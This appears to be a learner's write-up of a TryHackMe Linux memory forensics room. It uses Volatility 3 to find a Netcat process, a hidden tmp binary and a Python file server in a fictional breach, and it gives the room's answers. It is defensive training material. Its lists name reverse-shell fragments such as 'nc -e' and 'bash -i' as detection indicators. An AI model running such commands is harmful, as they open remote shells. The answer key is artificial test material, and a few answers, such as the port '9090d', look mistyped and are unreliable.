<h1 align="center">Linux Memory & Network<br><img width="1200px" src="https://github.com/user-attachments/assets/3c611801-4d91-40e8-b35b-a2395cf04ada"></h1>

<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/cd4e5dca-28bb-4fdb-972b-8ebd508fbf9b"><br>
June 12, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure,<br>
part of my <code>402</code>-day-streak in<a href="https://tryhackme.com">TryHackMe</a>.<br>
Identify C2 traffic & post-exploit activity in Windows memory.<a href="https://tryhackme.com/room/windowsmemoryandnetwork"</a>here.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/5e60674d-8cac-45f1-9dfd-3d8df4aa1bdb"></p>

<h2> Task 1 . Introduction</h2>

<p>When investigating a cyber incident, a system's memory is one of the most volatile and revealing sources of evidence. Memory forensics helps uncover valuable information about what was happening on a machine at a specific time, such as running processes, open files, network connections, credentials, and more.<br><br><br>

In this room, we will continue our investigation of the APT attack on the TryHatMe company and look at the footprints that the adversary left behind in the memory of the Linux machine. It is suspected that the adversary got access to the Linux server via lateral movement.</p>

<h3>Prerequisites</h3>

<p>To understand the concepts and technicalities covered in this room, it is expected that the user is well-versed with Volatility and has covered the following rooms:</p>

- Volatility<br>
- Linux Live Analysis<br>
- Windows Memory & User Activity<br>
- Windows Memory & Processes</p>

<h3>Learning Objectives</h3>
<p> In this room, we will examine the footprints of the adversary's actions in the compromised Linux server. Some of the key topics that we will cover are:<br>

- Overview of the Linux and Windows memory layout.<br>
- Learn how to utilize Volatility to investigate Linux memory.<br>
- Learn how to investigate the running processes and network connections and identify the odd ones.</p>

<p>Let's dive in.</p>

<h3 align="left"> Answer the question below</h3>

> 1.1. <em>Continue to the next task.</em><br><a id='1.1'></a>
>> <strong><code>No answer needed</code></strong><br>
<p></p>

<br>

<h2> Task 2 . Scenario Information</h2>
<p>This is the continuation of the scenario covered in the previous rooms. We will focus on the Linux Server compromised via lateral movement in this room. </p>

<h3>Recapping the Scenario</h3>
<p></p>You are part of the incident response team handling an incident at TryHatMe - a company that exclusively sells hats online. You are tasked with analyzing a full memory dump of a potentially compromised Linux host. Before you, another analyst had already taken a full memory dump and gathered all the necessary information from the TryHatMe IT support team. Since this is your first case, you are a bit nervous, but don't worry; a senior analyst will guide you.</p>

<h3>Information Incident THM-0001</h3>

<p>

- On May 5th, 2025, at 07:30 CET, TryHatMe initiated its incident response plan and escalated the incident to us. After an initial triage, our team found a Windows host that was potentially compromised. This led to a full-scale investigation and discovered that the Linux server FS-01 was also compromised along with the Windows machines.<br>
- The details of the host are as follows:<br>
--- Hostname: FS-01<br>
--- OS: Linux 5.15.0-1066<br>
-At 07:45 CET, our analyst Steve Stevenson took a full memory dump of the Windows host and made a hash to ensure its integrity. The memory dump details are:<br>
--- Name: FS-01.mem<br>
--- MD5-hash: c0fbf40989bda765b8edaa41f72d3ee9<br>

<h3>Company Information TryHatMe</h3>
<p>Network Map</p>

![image](https://github.com/user-attachments/assets/618c3a46-443b-4407-bc46-c9439127f4fd)

<p>Let's move on to the next task: Connect to our analysis lab and start to investigate the adversary's footprints in the Linux server's memory.</p>

<h3 align="left"> Answer the question below</h3>

> 2.1. <em>Continue to the next task.</em><br><a id='2.1'></a>
>> <strong><code>No answer needed</code></strong><br>
<p></p>

<br>

<h2> Task 3 . Lab Connection</h2>
<h3>Start Machine</h3>
<p>[ Start Machine ]</p>

<p>Before moving forward, start the lab by clicking the <code>Start Machine</code> button. It will take 3 minutes to load properly. The VM will be accessible on the right side of the split screen. If the VM is not visible, use the blue Show Split View button at the top of the page.<br><br>

Note: The memory image <code>FS-01.mem</code> used in this room is in the <code>/home/ubuntu/Desktop/artifacts/ directory</code>.</p>

<h3 align="left"> Answer the question below</h3>

> 3.1. <em>Continue to the next task.</em><br><a id='3.1'></a>
>> <strong><code>No answer needed</code></strong><br>
<p></p>

<br>

<h2> Task 4 . Memory Overview: Linux vs Windows</h2>
<p>It is important to understand how memory works in Linux before starting to analyze the memory dump. While Linux and Windows utilize RAM for process execution, system caching, and runtime operations, their memory architectures, management, and artifacts differ substantially.<br><br>

This task provides an overview of Linux memory and how it contrasts with Windows memory systems. You’ll learn key concepts such as virtual memory, page tables, memory regions, and how memory appears in forensic dumps.</p>

<h3>Memory</h3>
<p>Memory (RAM) is where active processes and kernel operations are stored during system operation. Both operating systems use virtual memory to give each process the illusion of having its own isolated memory space.<br><br>

However, their memory management models diverge in key areas:</p>

![image](https://github.com/user-attachments/assets/3beadea9-4d83-4f54-bbc0-fd50653ea271)

<h3>How Linux Manages Memory</h3>
<p>

- Physical vs Virtual Memory: Every process is given a virtual address space. Using page tables, the MMU (Memory Management Unit) translates these to physical addresses.<br>
- Memory-mapped Files: Shared libraries and files are loaded into memory using <code>mmap()</code>. This helps in efficient sharing across processes.<br>
- Kernel Memory: Managed separately from normal programs. <br>
- Swap: When RAM is exhausted, less-used memory pages are moved to swap, freeing space.<br><br>

Linux and Windows both use virtual memory, but their internal structures and exposure to forensics tools differ. Linux provides more direct access to live memory views through the <code>/proc</code> filesystem, while Windows relies on kernel-level structures like Virtual Address Descriptors (VADs) to manage memory.
</p>

<h3>Recapping the Process</h3>
<p>A process is a fundamental unit of execution in an operating system. It represents a running instance of a program, including its memory, CPU context, and system resources. While both Linux and Windows support multitasking through processes, they differ significantly in how they structure, manage, and expose process data. Understanding these differences is vital in memory forensics and threat detection. At its core, a process includes a unique process ID (PID), a dedicated memory space, an execution context (like CPU registers and scheduling data), and a set of resources such as open files and network connections. A process consists of:</p>

<p>

- A PID (Process ID): A process ID (PID) is a unique identifier the operating system assigns to every active process. It enables tracking, managing, and referencing a process during its lifecycle.<br><br>
- Memory space: Each process gets its own virtual address space, broken into key regions:<br>
---Code segment: Contains executable instructions.<br>
---Heap: Dynamically allocated memory (e.g., via malloc()).<br>
----Stack: Manages function calls and local variables.<br>
----Memory-mapped files: Files mapped into memory (e.g., shared libraries, config files).<br>
- Execution context (registers, scheduling info): The execution context of a process or thread includes:<br><br>
---Register values: EIP/RIP for instruction pointer and ESP/RSP for stack pointer.<br>
---Program counter: Tracks instruction execution.<br>
---Scheduler metadata: Priority, CPU time, and state (running, sleeping, etc.).<br>
- Open File Descriptors: File descriptors (FDs) are integer handles pointing to open files, sockets, or pipes used by a process. On UNIX-like systems, this includes everything from log files to /dev/null to TCP ports.<br><br>
- Parent/Child Relationships (Process Tree): Processes are organized hierarchically. A parent spawns a child using system calls like fork() (Unix) or CreateProcess() (Windows). This forms a process tree, which is useful for tracing activity lineage.</p>


<p>Processes may spawn other processes, forming parent-child relationships that define process trees. In forensic terms, a process also leaves behind runtime artifacts that help analysts determine what was executed, how it behaved, and what resources it accessed.</p>

<h3>Linux vs Windows: Process Models</h3>
<p>In Linux, each process is internally represented by a structure called task_struct. This kernel-level data structure holds PID, state, memory pointers, CPU usage, and more information. Linux also treats threads as lightweight processes, meaning every thread has its own PID. It is managed similarly to full processes, with specific flags (via the clone() system call) differentiating thread behavior.<br><br>

On Windows, the equivalent structure is EPROCESS, which resides in kernel memory. Unlike Linux, threads in Windows exist as entities within a process; they do not have standalone identifiers visible like Linux threads do.</p>

![image](https://github.com/user-attachments/assets/333ce8ba-0915-4a54-bc2b-a09b66fd8434)

  
<h3>Anatomy of a Linux Process</h3>
<p>Linux offers transparent access to live process information through the /proc pseudo-filesystem. For example:</p>
<p>

- /proc/<pid>/cmdline provides command-line arguments.<br>

- /proc/<pid>/status shows metadata like UID, memory usage, and thread count.<br>

- /proc/<pid>/exe is a symlink to the binary executed.<br>

- /proc/<pid>/maps reveals memory layout.<br>

- /proc/<pid>/fd/ lists open file descriptors.</p>

<p>From a forensic perspective, Linux gives direct access to live process artifacts through the /proc filesystem. Analysts can check memory maps, open files, load libraries, and even inspect a running binary via symbolic links. This transparency is a powerful feature in Linux for live system analysis.</p>

<h3 align="left"> Answer the question below</h3>

> 4.1. <em>Continue to the next task.</em><br><a id='4.1'></a>
>> <strong><code>No answer needed</code></strong><br>
<p></p>

<br>

<h2> Task 5 . Hunting for Suspicious Process</h2>
<p>Now that our lab machine is loaded, let's start examining the Linux memory image to find the footprints of the attack patterns. We may wonder where to begin our analysis. Let's start by reviewing the running processes on the machine at the time of the capture. We'll use Volatility to examine a Linux memory image placed in the folder on the Desktop. Our goal is to hunt for suspicious processes that may indicate compromise. This includes checking unusual process names, parent-child relationships, anomalous users, hidden processes, and privilege escalation attempts.</p>

<h3>Verifying the Hash</h3>
<p>Let's run the following command to verify the integrity of the Linux memory dump, as shown below:</p>

<p>Integrity Check</p>

```bash
ubuntu@tryhackme:~/Desktop/artifacts$ md5sum FS-01.mem      
c0fbf40989bda765b8edaa------  FS-01.mem
```

<p>As it will take time to process, the command output is already stored in the md5_hash file.</p>

<h3>Volatility Usage</h3>
<p>In this room, we will rely on Volatility 3 to extract the volatile footprints of the attack on the Linux machine at the time of the memory capture. Let's run the following command to get the Volatility help:</p>
<p>Command: vol3 --help</p>

<p>Volatility Help</p>

```bash
ubuntu@tryhackme:~/Desktop/artifacts$ vol3 --help
Volatility 3 Framework 2.26.2
usage: vol.py [-h] [-c CONFIG] [--parallelism [{processes,threads,off}]]
              [-e EXTEND] [-p PLUGIN_DIRS] [-s SYMBOL_DIRS] [-v] [-l LOG]
              [-o OUTPUT_DIR] [-q] [-r RENDERER] [-f FILE] [--write-config]
              [--save-config SAVE_CONFIG] [--clear-cache]
              [--cache-path CACHE_PATH] [--offline | -u URL]
              [--filters FILTERS] [--hide-columns [HIDE_COLUMNS ...]]
              [--single-location SINGLE_LOCATION] [--stackers [STACKERS ...]]
              [--single-swap-locations [SINGLE_SWAP_LOCATIONS ...]]
              PLUGIN ...
---- REDACTED-----
```

<h3>Linux Plugins</h3>
<p>We can use the grep to list down the available plugins for the Linux image, using the command vol3 --help | grep linux as shown below:</p>

<p>Available Linux Plugins</p>

```bash
ubuntu@tryhackme:~/Desktop/artifacts$ vol3 --help | grep linux
banners.Banners : Attempts to identify potential Linux banners
linux.bash.Bash Recovers bash command history from memory.
linux.boottime.Boottime
linux.capabilities.Capabilities
linux.check_afinfo.Check_afinfo
linux.check_creds.Check_creds
linux.check_idt.Check_idt
linux.check_modules.Check_modules
linux.check_syscall.Check_syscall
linux.ebpf.EBPF Enumerate eBPF programs
linux.elfs.Elfs Lists all memory-mapped ELF files for all processes.
linux.envars.Envars
linux.graphics.fbdev.Fbdev
linux.hidden_modules.Hidden_modules
linux.iomem.IOMem  generates an output similar to /proc/iomem on a
linux.ip.Addr  Lists network interface information for all devices
linux.ip.Link  Lists information about network interfaces similar to
----REDACTED----
```

<h3>Identify the Correct Linux Banner</h3>
<p>Before starting to work with Volatility, it is important to note that Volatility version 2 is needed to identify the correct profile. Volatility 3, which we are using in this room, needs to have the symbols table of the Operating System version you are analyzing to understand the structure of the memory dump. </p>
<p>Command: vol3 -f FS-01.mem banners.Banners</p>

<p>Terminal</p>

```bash
ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem banners.Banners
Volatility 3 Framework 2.26.2
Progress:  100.00		PDB scanning finished                
Offset	Banner
0x18600200  Linux version 5.15.0-1066-aws (buildd@lcy02-amd64-037) (gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #72~20.04.1-Ubuntu SMP Thu Jul 18 10:41:27 UTC 2024 (Ubuntu 5.15.0-1066.72~20.04.1-aws 5.15.158)
0x1a6396f8	Linux version 5.15.0-1066-aws (buildd@lcy02-amd64-037) (gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #72~20.04.1-Ubuntu SMP Thu Jul 18 10:41:27 UTC 2024 (Ubuntu 5.15.0-1066.72~20.04.1-aws 5.15.158)8)
0x65db6e40	Linux version 5.15.0-1066-aws (buildd@lcy02-amd64-037) (gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #72~20.04.1-Ubuntu SMP Thu Jul 18 10:41:27 UTC 2024 (Ubuntu 5.15.0-1066.72~20.04.1-aws 5.15.158)
```

<p>As it will take time to process, the command output is stored in the linux_banner file.</p>

<h3>List All Running Processes</h3>

<p>Lists the active processes as stored in the OS kernel's task list. This provides a snapshot of what was running at the time of capture.<br><br>

Note: As it will take time to process, the command output is already stored in the pslist_output file.<br><br>

Command: vol3 -f FS-01.mem linux.pslist.PsList</p>

<p>Terminal</p>

```bash
ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.pslist.PsList
Volatility 3 Framework 2.26.2
Progress:  100.00		Stacking attempts finished           
OFFSET (V)	PID	TID	PPID	COMM	UID	GID	EUID	EGID	CREATION TIME	File output

0x8be20024cc80	1	1	0	systemd	0	0	0	0	2025-06-02 09:50:56.255885       UTC	Disabled
0x8be20024b300	2	2	0	kthreadd	0	0	0	0	2025-06-02 09:50:56.255885     UTC	Disabled
0x8be200248000	3	3	2	rcu_gp	0	0	0	0	2025-06-02 09:50:56.367885         UTC	Disabled
0x8be20024e600	4	4	2	rcu_par_gp	0	0	0	0	2025-06-02 09:50:56.367885     UTC	Disabled
0x8be200249980	5	5	2	slub_flushwq	0	0	0	0	2025-06-02 09:50:56.367885 UTC	Disabled
0x8be20025cc80	6	6	2	netns	0	0	0	0	2025-06-02 09:50:56.367885         UTC	        Disabled
0x8be200258000	8	8	2	kworker/0:0H	0	0	0	0	2025-06-02 09:50:56.367885 UTC	Disabled
0x8be200259980	10	10	2	mm_percpu_wq	0	0	0	0	2025-06-02 09:50:56.367885 UTC	Disabled
0x8be200263300	11	11	2	rcu_tasks_rude_	0	0	0	0	2025-06-02 09:50:56.367885 UTC	Disabled
0x8be200260000	12	12	2	rcu_tasks_trace	0	0	0	0	2025-06-02 09:50:56.367885 UTC	Disabled      
------------------------REDACTED-------------------------------------------------
```

<p>We can also save the output to a file and then read the output file for further analysis, as shown below:<br><br>

Command: vol3 -f FS-01.mem linux.pslist.PsList > ps_output</p>

<p>Terminal</p>

```bash
ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.pslist.PsList > ps_output      
ubuntu@tryhackme:~$ cat ps_output
Volatility 3 Framework 2.26.2
Progress:  100.00		Stacking attempts finished           
OFFSET (V)	PID	TID	PPID	COMM	UID	GID	EUID	EGID	CREATION TIME	File output

0x8be20024cc80	1	1	0	systemd	0	0	0	0	2025-06-02 09:50:56.255885         UTC	Disabled
0x8be20024b300	2	2	0	kthreadd	0	0	0	0	2025-06-02 09:50:56.255885     UTC	Disabled
0x8be200248000	3	3	2	rcu_gp	0	0	0	0	2025-06-02 09:50:56.367885         UTC	Disabled
0x8be20024e600	4	4	2	rcu_par_gp	0	0	0	0	2025-06-02 09:50:56.367885     UTC	Disabled      
-------------------------------REDACTED------------------------------------------------------------
```

<h5>Forensics Value</h5>

<p>

- Displays all currently linked processes from the kernel task list.<br>
- Reflects what the live system’s ps or top commands would show.<br>
- Helps establish the baseline of visible processes at the time of capture.<br>
- Validates running services, daemons, shells, and tools.<br>
- Can help identify suspicious tools running (e.g., nc, python, wget).</p>


<h3>PsScan</h3>

<p>We can use the PsScan plugin to let Volatility scan the memory for the processes based on the signature and retrieve the hidden processes that the PsScan plugin may have missed.<br>

Note: The command will take about 2 minutes to fully execute.<br>

Command: vol3 -f FS-01.mem linux.psscan.PsScan</p>


<p>Terminal</p>

```bash
ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.psscan.PsScan
Volatility 3 Framework 2.26.2
Progress:  100.00		Stacking attempts finished           
OFFSET (V)	PID	TID	PPID	COMM	UID	GID	EUID	EGID	CREATION TIME	File output

0x8be20024cc80	1	1	0	systemd	0	0	0	0	2025-06-02 09:50:56.255885 UTC	Disabled
0x8be20024b300	2	2	0	kthreadd	0	0	0	0	2025-06-02 09:50:56.255885 UTC	Disabled
0x8be200248000	3	3	2	rcu_gp	0	0	0	0	2025-06-02 09:50:56.367885 UTC	Disabled
0x8be20024e600	4	4	2	rcu_par_gp	0	0	0	0	2025-06-02 09:50:56.367885 UTC	Disabled
0x8be200249980	5	5	2	slub_flushwq	0	0	0	0	2025-06-02 09:50:56.367885 UTC	Disabled
0x8be20025cc80	6	6	2	netns	0	0	0	0	2025-06-02 09:50:56.367885 UTC	Disabled
0x8be200258000	8	8	2	kworker/0:0H	0	0	0	0	2025-06-02 09:50:56.367885 UTC	Disabled
0x8be200259980	10	10	2	mm_percpu_wq	0	0	0	0	2025-06-02 09:50:56.367885 UTC	Disabled
0x8be200263300	11	11	2	rcu_tasks_rude_	0	0	0	0	2025-06-02 09:50:56.367885 UTC	Disabled
0x8be200260000	12	12	2	rcu_tasks_trace	0	0	0	0	2025-06-02 09:50:56.367885 UTC	Disabled      
------------------------------REDACTED-----------------------------------------------------
```

<p>The command output is already stored in the psscan_output file. Examine the output and see if you can find some processes with suspicious arguments. This scan is useful, especially in retrieving hidden or terminated processes with footprints still in memory.</p>

<h5>Forensics Value</h5>

- Detects hidden or unlinked processes, rootkits, etc.<br>
- Reveals terminated or orphaned processes still in memory.<br>
- Cross-referencing psscan with pslist helps find stealth malware.<br>
- Critical for post-compromise investigations where attackers attempt to hide activity.</p>

<h3>Processes With Arguments</h3>
<p>Another interesting plugin is psaux, which helps us retrieve processes with arguments. This plugin can be used to identify suspicious processes with odd-looking arguments passed to them.<br><br>

Command: vol3 -f FS-01.mem linux.psaux.PsAux</p>

<p>Terminal</p>

```bash
ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.psaux.PsAux                     
Volatility 3 Framework 2.26.2     
Progress:  100.00        Stacking attempts finished                
PID    PPID    COMM        ARGS
1      0    systemd    /sbin/init      
707    1    cron        /usr/sbin/cron -f      
715    1    whoopsie    /usr/bin/whoopsie -f      
716    1    atd          /usr/sbin/atd -f      
738    1    kerneloops    /usr/sbin/kerneloops --test     
746    1    agetty       /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220      
752    1    kerneloops    /usr/sbin/kerneloops     
754    1    lightdm      /usr/sbin/lightdm    
764    1    agetty      /sbin/agetty -o -p -- \u --noclear tty1 linux     
821    1    REDACTED    /home/REDACTED     
838    1    systemd      /lib/systemd/systemd --user     
841    838    (sd-pam)    (sd-pam)     
904    1    rtkit-daemon    /usr/libexec/rtkit-daemon
17374    17344    python3    python3 -m http.server REDACTED
---------------------REDACTED---------------------------------------------------
```

<p>The command output is already stored in the psaux_output file. Examine the output and see if you can find some processes with suspicious arguments.</p> 

<h5>Forensics Value</h5>

- Provides the full command-line for each running process (like ps aux).<br>
- Reveals use of suspicious commands or flags (e.g., nc -e, curl http, bash -i).<br>
- Useful for reverse shell detection, malicious script execution, or credential theft.<br>
- Allows correlation between PID and behavior observed in other plugins (e.g., netstat or maps).<br>
- Helps differentiate legitimate vs. abused binaries.</p>


<h3>Process Mapping</h3>

<p>The plugin proc.Maps enumerates memory mappings for processes in a Linux memory dump. It mimics the contents of /proc/<pid>/maps on a live system, showing how each process maps executable files, shared libraries, heap/stack regions, and potentially malicious memory allocations into its address space.<br><br>

Command: vol3 -f FS-01.mem linux.proc.Maps</p>

<p>Terminal</p>

```bash
ubuntu@tryhackme:~$ vol3 -f FS-01.mem linux.proc.Maps      
Volatility 3 Framework 2.26.2     
Progress:  100.00        Stacking attempts finished
PID    Process    Start    End    Flags    PgOff    Major    Minor    Inode    File Path    File output      
1    systemd    0x559fc4e4b000    0x559fc4e7d000    r--    0x0    259    1    17651    /usr/lib/systemd/systemd    Disabled      
1    systemd    0x559fc4e7d000    0x559fc4f3c000    r-x    0x32000    259    1    17651    /usr/lib/systemd/systemd    Disabled      
1    systemd    0x559fc4f3c000    0x559fc4f92000    r--    0xf1000    259    1    17651    /usr/lib/systemd/systemd    Disabled      
1    systemd    0x559fc4f92000    0x559fc4fd8000    r--    0x146000    259    1    17651    /usr/lib/systemd/systemd    Disabled     
1    systemd    0x559fc4fd8000    0x559fc4fd9000    rw-    0x18c000    259    1    17651    /usr/lib/systemd/systemd    Disabled     
1    systemd    0x559fc50d1000    0x559fc53c0000    rw-    0x0    0    0    0    [heap]    Disabled      
1    systemd    0x7fefc4000000    0x7fefc4021000    rw-    0x0    0    0    0    Anonymous Mapping    Disabled     
1    systemd    0x7fefc4021000    0x7fefc8000000    ---    0x0    0    0    0    Anonymous Mapping    Disabled      
1    systemd    0x7fefcc000000    0x7fefcc021000    rw-    0x0    0    0    0    Anonymous Mapping    Disabled      
1    systemd    0x7fefcc021000    0x7fefd0000000    ---    0x0    0    0    0    Anonymous Mapping    Disabled     
1    systemd    0x7fefd2d35000    0x7fefd2d36000    ---    0x0    0    0    0    Anonymous Mapping    Disabled     
1    systemd    0x7fefd2d36000    0x7fefd3536000    rw-    0x0    0    0    0    Anonymous Mapping    Disabled     
1    systemd    0x7fefd3536000    0x7fefd3537000    ---    0x0    0    0    0    Anonymous Mapping    Disabled      
1    systemd    0x7fefd3537000    0x7fefd3d3e000    rw-    0x0    0    0    0    Anonymous Mapping    Disabled      
1    systemd    0x7fefd3d3e000    0x7fefd3d4b000    r--    0x0    259    1    22584    /usr/lib/x86_64-linux-gnu/libm-2.31.so    Disabled      
1    systemd    0x7fefd3d4b000    0x7fefd3df2000    r-x    0xd000    259    1    22584    /usr/lib/x86_64-linux-gnu/libm-2.31.so    Disabled     
1    systemd    0x7fefd3df2000    0x7fefd3e8b000    r--    0xb4000    259    1    22584    /usr/lib/x86_64-linux-gnu/libm-2.31.so    Disabled      
1    systemd    0x7fefd3e8b000    0x7fefd3e8c000    r--    0x14c000    259    1    22584    /usr/lib/x86_64-linux-gnu/libm-2.31.so    Disabled     
1    systemd    0x7fefd3e8c000    0x7fefd3e8d000    rw-    0x14d000    259    1    22584    /usr/lib/x86_64-linux-gnu/libm-2.31.so    Disabled      
-------------------------------[REDACTED]--------------------------------------------------------------------
```

<p>As it will take time to process, the command output is stored in the procmap_output file. Examine the output and see if you can find some processes with suspicious arguments. </p>

<h5>Forensics Value</h5>

<p>

- Reveals how each process maps memory regions (executables, libraries, heap, stack, anonymous regions).<br>
- Detects in-memory malware(e.g., unpacked payloads, injected shellcode).<br>
- Flags suspicious permissions like rwxp (read-write-execute-private) are often used for shellcode.<br>
- Helps identify fileless malware, as memory segments may hold active code.<br>
- Detects processes loading binaries from suspicious paths (e.g., /tmp/).<br>
- Allows reconstruction of process layout to correlate with behavior or anomaly.<br>
- Essential for confirming the process of hollowing or injection.</p>
  
</p>

<h3 align="left"> Answer the questions below</h3>

> 5.1. <em>What is the MD5 hash of the image we are investigating?</em><br><a id='5.1'></a>
>> <strong><code>c0fbf40989bda765b8edaa41f72d3ee9</code></strong><br>
<p></p>

![image](https://github.com/user-attachments/assets/425ec90f-86b8-4fe4-99ab-0dfc7dbd24d2)

<br>

> 5.2. <em>What is the PID of the suspicious Netcat process?</em><br><a id='5.2'></a>
>> <strong><code>15011</code></strong><br>
<p></p>

![image](https://github.com/user-attachments/assets/bd7d3846-cfe7-4e0d-9435-79b3a06a9e3a)

<br>

> 5.3. <em>What is the name of the suspicious process running from the hidden tmp directory?</em><br><a id='5.3'></a>
>> <strong><code>.strokes</code></strong><br>
<p></p>

![image](https://github.com/user-attachments/assets/e9db44e4-3fe7-4df8-a397-e3d6f6f05c15)


<br>

> 5.4. <em>What port number was used while setting up a Python server to transfer files?</em><br><a id='5.4'></a>
>> <strong><code>9090d</code></strong><br>
<p></p>

![image](https://github.com/user-attachments/assets/0ab38c86-125c-4189-9fb6-a92ae2e85b21)

<br>

> 5.5. <em>A suspicious process with PID 821 was found running on the system. What is the full path of the process?</em><br><a id='5.4'></a>
>> <strong><code>/home/mircoservice/printer_app</code></strong><br>
<p></p>

![image](https://github.com/user-attachments/assets/ee5738b6-b58c-4024-aa2a-89399c48ac9f)

<br>

<h2> Task 6 . Hunting for Suspicious Network Activities</h2>
<p>Analyzing memory for suspicious network connections is crucial when investigating malware, persistence, or lateral movement. Attackers often use reverse shells, backdoors, or tunnels; memory may be the only place to detect them. In the memory, we can look for the footprints of the network connections and hunt for the suspicious ones.<br><br>

Some of the key information we can look for in terms of network connection in the Linux memory is:</p>

<p>

- Open Network connections
- Reverse Shell
- Socket details
- Network Interfaces</p>

<h3>Identify IP Information</h3>


```bash
ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.ip.Addr          
Volatility 3 Framework 2.26.2
Progress:  100.00		Stacking attempts finished           
NetNS	Index	Interface	MAC	Promiscuous	IP	Prefix	Scope Type	State
4026531840	1	lo	00:00:00:00:00:00	False	127.0.0.1	8	host	UNKNOWN
4026531840	1	lo	00:00:00:00:00:00	False	::1	128	host	UNKNOWN
4026531840	2	ens5	02:83:88:6b:5a:1f	False	[--REDACTED--]	16	global	UP
4026531840	2	ens5	02:83:88:6b:5a:1f	False	fe80::83:88ff:fe6b:5a1f	64	link	UP
4026532265	1	lo	00:00:00:00:00:00	False	127.0.0.1	8	host	UNKNOWN
4026532265	1	lo	00:00:00:00:00:00	False	::1	128	host	UNKNOWN
```

<p>The command's output is already placed in the ip.addr_output file. This command provides information about the network interfaces, corresponding MAC addresses, and associated IP addresses.</p>

<h3>Identify Network Interface Information</h3>

<p>The following command will show the layer two interface information from the memory image. It shows the network devices/interfaces recognized by the kernel.<br><br>

Command: vol3 -f FS-01.mem linux.ip.Link</p>

<p>Network Interface Information</p>

```bash
ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.ip.Link         
Volatility 3 Framework 2.26.2
Volatility 3 Framework 2.26.2
Progress:  100.00        Stacking attempts finished  
         
NS           Interface    MAC               State    MTU      Qdisc                Qlen        Flags
026531840      lo    00:00:00:00:00:00    UNKNOWN    65536    noqueue    1000    LOOPBACK,LOWER_UP,UP
4026531840    ens5    [REDACTED]    UP     9001       mq    1000    BROADCAST,LOWER_UP,MULTICAST,UP
4026532265     lo    00:00:00:00:00:00    UNKNOWN    65536    noqueue    1000    LOOPBACK,LOWER_UP,UP
```

<p>The command's output is already placed in the ip.link_output file. From a forensics point of view, we can examine the network interface information to identify some suspicious VPN tunneling or interfaces.</p>

<h3>Explore Socket Details</h3>
<p>We can extract the socket usage statistics from the kernel's perspective using the following command:<br><br>

Commandline: vol3 -f FS-01.mem linux.sockstat.Sockstat</p>

<p>Checking Socket Details/p>

```bash
ubuntu@tryhackme:~/Desktop/artifacts$ vol3 -f FS-01.mem linux.sockstat.Sockstat
Volatility 3 Framework 2.26.2
NetNS    Process Name    PID    TID    FD    Sock Offset    Family    Type    Proto    Source Addr    Source Port    Destination Addr    Destination Port    State    Filter
026531840    systemd    1    1    126    0x8be20fd74440    AF_UNIX    STREAM    -    /run/systemd/journal/stdout      4738760    -    4738759    ESTABLISHED    -
4026531840    systemd    1    1    127    0x8be207236a80    AF_UNIX    STREAM    -    /run/systemd/journal/stdout    4738761    -    4739223    ESTABLISHED    -
4026531840    systemd    1    1    135    0x8be2038bfb80    AF_UNIX    STREAM    -    /run/avahi-daemon/socket       19420    -    -    LISTEN    -
4026531840    systemd    1    1    137    0x8be204ed2200    AF_UNIX    STREAM    -    /run/lvm/lvmpolld.socket    1746    -    -    LISTEN    -
4026531840    systemd    1    1    138    0x8be204edc880    AF_UNIX    STREAM    -    /run/snapd.socket    19429    -    -    LISTEN    -
4026531840    systemd    1    1    139    0x8be204edd980    AF_UNIX    STREAM    -    /run/snapd-snap.socket    19431    -    -    LISTEN    -
4026531840    systemd    1    1    140    0x8be2038b1540    AF_UNIX    STREAM    -    /run/acpid.socket    19807    -    -    LISTEN    -
4026531840    systemd    1    1    141    0x8be2038bea80    AF_UNIX    STREAM    -    /run/dbus/system_bus_socket    19424    -    -    LISTEN    -
4026531840    systemd    1    1    142    0x8be204ed2a80    AF_UNIX    STREAM    -    /run/systemd/journal/stdout    1759    -    -    LISTEN    -
4026531840    systemd    1    1    144    0x8be204ed0440    AF_UNIX    DGRAM    -    /run/systemd/journal/socket    1761    -    -    UNCONNECTED    -
4026531840    systemd    1    1    145    0x8be2038beec0    AF_UNIX    STREAM    -        19426    -    -    LISTEN    -
4026531840    systemd    1    1    146    0x8be204ed0880    AF_UNIX    DGRAM    -    /run/systemd/journal/dev-log    1757    -    -    UNCONNECTED    -
4026531840    systemd    1    1    147    0x8be203cb7000    AF_NETLINK    RAW    NETLINK_ROUTE    groups:0x800405d5    1    group:0x000000000    UNCONNECTED    -
4026531840    systemd    1    1    148    0x8be203cb2800    AF_NETLINK    RAW    NETLINK_AUDIT    groups:0x00000001    1    group:0x000000000    UNCONNECTED    -
4026531840    systemd    1    1    194    0x8be204ed1dc0    AF_UNIX    SEQPACKET    -    /run/udev/control    1764    -    -    UNCONNEC
```

<p>Note: The command takes about 2 minutes to fully execute. You can also find the information stored in the socket_output file.<br><br>

Let's break down some key information we get from this command:</p>


<p>

- Process Name: Name of the process using the socket (from /proc/<pid>/comm).<br>
- PID: Process ID that owns the socket.<br>
- Source Address: the file path bound to the socket.<br>
- STATE: Socket state: LISTEN, ESTABLISHED, UNCONNECTED, etc.<br>
- Source Port / Destination Port: Source Port / Destination Port associated with the socket.</p>

<h5>Forensics Value</h5>
<p>

- Detects overall network activity from the kernel’s view, helping confirm if the system was engaged in active connections during the memory capture. <br>
- Identifies potential backdoors or reverse shells by revealing unexpected socket usage.<br>
- Helps examine and hunt for abnormal socket counts or excessive memory usage allocated to network connections.</p>

<p>Investigating the footprints of network-based activity in memory is an important part of forensics. It provides visibility into all networking layers: -interfaces, IP configurations, and socket-level behavior.<br><br>

